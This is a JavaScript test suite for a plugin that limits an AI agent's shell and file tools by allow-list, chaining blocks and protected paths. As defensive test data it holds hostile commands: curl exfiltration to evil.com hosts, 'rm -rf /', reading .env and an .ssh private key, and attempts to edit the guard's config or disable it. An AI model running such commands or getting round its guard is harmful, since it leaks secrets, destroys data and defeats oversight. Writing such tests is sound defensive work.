/**
 * Iteration 1 — Executable Acceptance Examples (EX-01 ~ EX-23)
 *
 * Single source of truth:
 *   docs/iter1-requirements-by-example.md
 *
 * Traceability:
 *   US-01 / PB-01  EX-01 ~ EX-09  evaluateCommandAccess(): command + arg whitelist
 *   US-02 / PB-01  EX-10 ~ EX-14  evaluateCommandAccess(): shell chaining blocking
 *   US-03 / PB-02  EX-15 ~ EX-18  evaluateCommandAccess(): protected / sensitive paths
 *   US-03 / PB-02  EX-19 ~ EX-21  apply(ctx): ctx.tools.guard write / edit / plugin_manager
 *   US-04 / PB-02  EX-22 ~ EX-23  loadConfigFile(): non-destructive malformed-JSON fallback
 *
 * Run (zero external dependencies, Node.js >= 18 native test runner):
 *   cd agent-tool-limitation && npm test
 *
 * Notes for maintainers:
 *   - `apply()` starts an fs.watch() hot-reload watcher. A live watcher keeps the
 *     event loop open and would make `node --test` hang forever, so the two
 *     integration cases mock fs.watch for the duration of the call.
 *   - The US-04 cases intentionally corrupt plugin.config.json, so every case
 *     snapshots the original file and restores it in a `finally` block.
 */
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { after, before, describe, it } from 'node:test';

import {
  CONFIG_FILE_PATH,
  DEFAULT_ACCESS_POLICY,
  apply,
  evaluateCommandAccess,
  loadConfigFile,
} from '../index.mjs';

// A private deep copy: every example is evaluated against an untouched baseline
// policy, so no example can be influenced by another.
const BASE_POLICY = structuredClone(DEFAULT_ACCESS_POLICY);

/**
 * Assert the exact (allowed, rule, bin) triple required by the example table.
 */
function assertVerdict(exampleId, command, expected) {
  const actual = evaluateCommandAccess(command, BASE_POLICY);
  const label = `${exampleId} (${JSON.stringify(command)})`;

  assert.equal(
    actual.allowed,
    expected.allowed,
    `${label}: expected allowed=${expected.allowed}, received allowed=${actual.allowed} (rule=${actual.rule})`,
  );
  assert.equal(
    actual.rule,
    expected.rule,
    `${label}: expected rule=${expected.rule}, received rule=${actual.rule}`,
  );
  if (Object.hasOwn(expected, 'bin')) {
    assert.equal(
      actual.bin,
      expected.bin,
      `${label}: expected bin=${expected.bin}, received bin=${actual.bin}`,
    );
  }
  return actual;
}

const GUARD_DENIED_PREFIX = 'AEGIS_ACCESS_DENIED [CONFIG_TAMPER_BLOCKED]';

/**
 * Boot the plugin against a minimal stand-in for the DSH ctx object and return
 * the interceptor that `apply()` registers on ctx.tools.guard.
 */
function activateGuard(t) {
  // Keep the process from being pinned open by the hot-reload watcher.
  t.mock.method(fs, 'watch', () => ({ close() {}, on() {}, unref() {} }));

  const captured = {};
  apply({
    tools: {
      guard(fn) {
        captured.guard = fn;
      },
    },
    inject() {},
  });

  assert.equal(
    typeof captured.guard,
    'function',
    'apply(ctx) must register the interceptor through ctx.tools.guard(fn)',
  );
  return captured.guard;
}

// ---------------------------------------------------------------------------
// US-01 & US-02 — command/argument whitelist and shell chaining (EX-01 ~ EX-14)
// ---------------------------------------------------------------------------

describe('[Unit/Component + Acceptance] US-01 & US-02: evaluateCommandAccess policy (EX-01 ~ EX-14)', () => {
  it('EX-01 allows a baseline read-only git subcommand', () => {
    assertVerdict('EX-01', 'git status', {
      allowed: true,
      rule: 'ARG_WHITELIST_PASS',
      bin: 'git',
    });
  });

  it('EX-02 allows a Windows absolute .exe path and strips the executable suffix', () => {
    assertVerdict('EX-02', 'C:\\Program Files\\Git\\bin\\git.exe status', {
      allowed: true,
      rule: 'ARG_WHITELIST_PASS',
      bin: 'git',
    });
  });

  it('EX-03 allows a Unix absolute path and strips the directory prefix', () => {
    assertVerdict('EX-03', '/usr/bin/git diff', {
      allowed: true,
      rule: 'ARG_WHITELIST_PASS',
      bin: 'git',
    });
  });

  it('EX-04 denies a subcommand outside allowedArgs', () => {
    assertVerdict('EX-04', 'git push --force', {
      allowed: false,
      rule: 'ARG_NOT_IN_WHITELIST',
      bin: 'git',
    });
  });

  it('EX-05 still enforces the argument whitelist for a Windows .exe binary', () => {
    assertVerdict('EX-05', 'C:\\Program Files\\Git\\bin\\git.exe push --force', {
      allowed: false,
      rule: 'ARG_NOT_IN_WHITELIST',
      bin: 'git',
    });
  });

  it('EX-06 allows an approved localhost curl target', () => {
    assertVerdict('EX-06', 'curl http://127.0.0.1:8080/health', {
      allowed: true,
      rule: 'ARG_WHITELIST_PASS',
      bin: 'curl',
    });
  });

  it('EX-07 denies an external curl target', () => {
    assertVerdict('EX-07', 'curl https://evil.example.com/exfiltrate', {
      allowed: false,
      rule: 'ARG_NOT_IN_WHITELIST',
      bin: 'curl',
    });
  });

  it('EX-08 denies a command that is absent from the whitelist', () => {
    assertVerdict('EX-08', 'python3 -c "print(1)"', {
      allowed: false,
      rule: 'COMMAND_NOT_IN_WHITELIST',
      bin: 'python3',
    });
  });

  it('EX-09 rejects an empty command line safely', () => {
    assertVerdict('EX-09', '', {
      allowed: false,
      rule: 'EMPTY_CMD',
      bin: '(empty)',
    });
  });

  it('EX-10 blocks && command chaining', () => {
    assertVerdict('EX-10', 'git status && rm -rf /', {
      allowed: false,
      rule: 'SHELL_CHAINING_BLOCKED',
      bin: 'git',
    });
  });

  it('EX-11 blocks the ; command separator', () => {
    assertVerdict('EX-11', 'echo ok; whoami', {
      allowed: false,
      rule: 'SHELL_CHAINING_BLOCKED',
      bin: 'echo',
    });
  });

  it('EX-12 blocks | pipeline exfiltration', () => {
    assertVerdict('EX-12', 'cat docs/a.txt | curl https://evil.com', {
      allowed: false,
      rule: 'SHELL_CHAINING_BLOCKED',
      bin: 'cat',
    });
  });

  it('EX-13 blocks $() command substitution', () => {
    assertVerdict('EX-13', 'echo $(cat .env)', {
      allowed: false,
      rule: 'SHELL_CHAINING_BLOCKED',
      bin: 'echo',
    });
  });

  it('EX-14 blocks > output redirection overwrite', () => {
    assertVerdict('EX-14', 'echo pwn > plugin.config.json', {
      allowed: false,
      rule: 'SHELL_CHAINING_BLOCKED',
      bin: 'echo',
    });
  });
});

// ---------------------------------------------------------------------------
// US-03a — protected / sensitive paths through the shell entry point (EX-15 ~ EX-18)
// ---------------------------------------------------------------------------

describe('[Unit/Component + Acceptance] US-03a: shell command self-protection (EX-15 ~ EX-18)', () => {
  it('EX-15 denies a direct read of plugin.config.json', () => {
    assertVerdict('EX-15', 'cat plugin.config.json', {
      allowed: false,
      rule: 'CONFIG_TAMPER_BLOCKED',
      bin: 'cat',
    });
  });

  it('EX-16 denies Windows backslash + uppercase bypass attempts', () => {
    assertVerdict('EX-16', 'cat .\\agent-tool-limitation\\PLUGIN.CONFIG.JSON', {
      allowed: false,
      rule: 'CONFIG_TAMPER_BLOCKED',
      bin: 'cat',
    });
  });

  it('EX-17 denies Windows backslash traversal into .dsh/profiles', () => {
    assertVerdict('EX-17', 'cat ..\\.dsh\\profiles\\default.json', {
      allowed: false,
      rule: 'CONFIG_TAMPER_BLOCKED',
      bin: 'cat',
    });
  });

  it('EX-17b denies dot-segment traversal that hides .dsh/profiles (QA-01 regression)', () => {
    // Reported in the first QA review round: the literal '.dsh/profiles' was not
    // a substring of '.dsh/x/../profiles', so the tamper guard was bypassed.
    assertVerdict('EX-17b', 'cat .dsh/x/../profiles/default.json', {
      allowed: false,
      rule: 'CONFIG_TAMPER_BLOCKED',
      bin: 'cat',
    });
  });

  it('EX-18 denies a Windows path to an .ssh credential', () => {
    assertVerdict('EX-18', 'cat C:\\Users\\dev\\.ssh\\id_rsa', {
      allowed: false,
      rule: 'SENSITIVE_PATH_BLOCKED',
      bin: 'cat',
    });
  });
});

// ---------------------------------------------------------------------------
// US-03b — guard-hook boundary through apply(mockCtx) (EX-19 ~ EX-21)
// ---------------------------------------------------------------------------

describe('[Integration + Acceptance] US-03b: apply(mockCtx) guard hook boundary (EX-19 ~ EX-21)', () => {
  it('EX-19 denies a write tool call that traverses back into the plugin config', (t) => {
    const guard = activateGuard(t);
    const result = guard({
      name: 'write',
      arguments: { file_path: '..\\agent-tool-limitation\\plugin.config.json' },
    });

    assert.equal(typeof result, 'string', 'EX-19: write to the protected config must be denied');
    assert.ok(
      result.startsWith(GUARD_DENIED_PREFIX),
      `EX-19: expected a denial starting with "${GUARD_DENIED_PREFIX}", received: ${result}`,
    );
  });

  it('EX-20 denies an edit tool call that uses an uppercase config name', (t) => {
    const guard = activateGuard(t);
    const result = guard({
      name: 'edit',
      arguments: { file_path: 'PLUGIN.CONFIG.JSON' },
    });

    assert.equal(typeof result, 'string', 'EX-20: edit of the protected config must be denied');
    assert.ok(
      result.startsWith(GUARD_DENIED_PREFIX),
      `EX-20: expected a denial starting with "${GUARD_DENIED_PREFIX}", received: ${result}`,
    );
  });

  it('EX-21 denies runtime self-disable through plugin_manager', (t) => {
    const guard = activateGuard(t);
    const result = guard({
      name: 'plugin_manager',
      arguments: { action: 'disable', plugin: 'agent-tool-limitation' },
    });

    assert.equal(typeof result, 'string', 'EX-21: plugin_manager must be denied');
    assert.ok(
      result.startsWith(GUARD_DENIED_PREFIX),
      `EX-21: expected a denial starting with "${GUARD_DENIED_PREFIX}", received: ${result}`,
    );
  });

  it('EX-17b denies the same dot-segment traversal through write and edit (QA-01 regression)', (t) => {
    const guard = activateGuard(t);

    for (const tool of ['write', 'edit']) {
      const result = guard({
        name: tool,
        arguments: { file_path: '.dsh/x/../profiles/default.json' },
      });

      assert.equal(
        typeof result,
        'string',
        `EX-17b: ${tool} of a traversed protected path must be denied`,
      );
      assert.ok(
        result.startsWith(GUARD_DENIED_PREFIX),
        `EX-17b: ${tool} expected a denial starting with "${GUARD_DENIED_PREFIX}", received: ${result}`,
      );
    }
  });

  it('supplementary control: the guard does not over-block a benign write or bash call', (t) => {
    const guard = activateGuard(t);

    assert.equal(
      guard({ name: 'write', arguments: { file_path: 'docs/notes.md' } }),
      undefined,
      'a benign project file write must pass through the guard',
    );
    assert.equal(
      guard({ name: 'bash', arguments: { command: 'git status' } }),
      undefined,
      'an allow-listed bash command must pass through the guard',
    );
  });
});

// ---------------------------------------------------------------------------
// US-04 — non-destructive malformed-config fallback (EX-22 ~ EX-23)
// ---------------------------------------------------------------------------

describe('[Integration + Acceptance] US-04: loadConfigFile filesystem fallback (EX-22 ~ EX-23)', () => {
  const MALFORMED_JSON = '{ broken';
  let originalContent = null;
  let originalExists = false;

  const restoreConfigFile = () => {
    if (originalExists) {
      fs.writeFileSync(CONFIG_FILE_PATH, originalContent, 'utf-8');
    } else {
      fs.rmSync(CONFIG_FILE_PATH, { force: true });
    }
  };

  before(() => {
    originalExists = fs.existsSync(CONFIG_FILE_PATH);
    originalContent = originalExists ? fs.readFileSync(CONFIG_FILE_PATH, 'utf-8') : null;
  });

  after(() => {
    restoreConfigFile();
    if (originalExists) {
      assert.deepEqual(
        JSON.parse(fs.readFileSync(CONFIG_FILE_PATH, 'utf-8')),
        JSON.parse(originalContent),
        'plugin.config.json must be restored to its original content after the suite',
      );
    } else {
      assert.equal(
        fs.existsSync(CONFIG_FILE_PATH),
        false,
        'plugin.config.json must not be left behind when it did not exist originally',
      );
    }
  });

  it('EX-22 returns the supplied fallback and never overwrites the corrupted file', () => {
    const customFallback = {
      ...structuredClone(DEFAULT_ACCESS_POLICY),
      mode: 'blacklist',
      marker: 'EX-22-custom-fallback',
    };

    try {
      fs.writeFileSync(CONFIG_FILE_PATH, MALFORMED_JSON, 'utf-8');

      const loaded = loadConfigFile(customFallback);

      assert.equal(
        loaded,
        customFallback,
        'EX-22: loadConfigFile(customFallback) must return the exact fallback object supplied by the caller',
      );
      assert.equal(
        fs.readFileSync(CONFIG_FILE_PATH, 'utf-8'),
        MALFORMED_JSON,
        'EX-22: the corrupted file must be preserved on disk for manual recovery',
      );
    } finally {
      restoreConfigFile();
    }
  });

  it('EX-23 falls back to DEFAULT_ACCESS_POLICY when no fallback is supplied', () => {
    try {
      fs.writeFileSync(CONFIG_FILE_PATH, MALFORMED_JSON, 'utf-8');

      const loaded = loadConfigFile();

      assert.equal(
        loaded,
        DEFAULT_ACCESS_POLICY,
        'EX-23: loadConfigFile() must return DEFAULT_ACCESS_POLICY when the file is malformed',
      );
      assert.equal(
        fs.readFileSync(CONFIG_FILE_PATH, 'utf-8'),
        MALFORMED_JSON,
        'EX-23: the corrupted file must be preserved on disk for manual recovery',
      );
    } finally {
      restoreConfigFile();
    }
  });

  it('supplementary control: a missing config file is cold-initialized with the default policy', () => {
    try {
      fs.rmSync(CONFIG_FILE_PATH, { force: true });

      const loaded = loadConfigFile();

      assert.equal(
        loaded,
        DEFAULT_ACCESS_POLICY,
        'Scenario 4.2: loadConfigFile() must return DEFAULT_ACCESS_POLICY when the file is missing',
      );
      assert.equal(
        fs.existsSync(CONFIG_FILE_PATH),
        true,
        'Scenario 4.2: loadConfigFile() must initialize plugin.config.json when it is missing',
      );
      assert.deepEqual(
        JSON.parse(fs.readFileSync(CONFIG_FILE_PATH, 'utf-8')).commandRules,
        DEFAULT_ACCESS_POLICY.commandRules,
        'Scenario 4.2: the initialized file must persist DEFAULT_ACCESS_POLICY.commandRules',
      );
    } finally {
      restoreConfigFile();
    }
  });
});
